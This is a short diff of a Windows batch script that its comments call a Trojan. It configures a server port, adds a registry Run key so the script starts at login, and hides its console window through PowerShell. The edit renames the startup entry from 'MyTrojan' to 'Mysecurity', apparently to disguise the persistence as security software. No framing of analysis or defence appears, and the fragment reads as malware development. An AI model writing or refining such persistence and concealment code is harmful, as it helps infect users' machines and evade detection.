@@ -7,7 +7,7 @@ set SERVER_PORT=1234       REM Replace with your desired port
 
 REM === MAIN CODE ===
 REM Create a registry key to run the Trojan on system startup
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MyTrojan" /t REG_SZ /d "%~dp0%~nx0" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Mysecurity" /t REG_SZ /d "%~dp0%~nx0" /f
 
 REM Hide the Trojan window
 powershell -WindowStyle Hidden -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'"
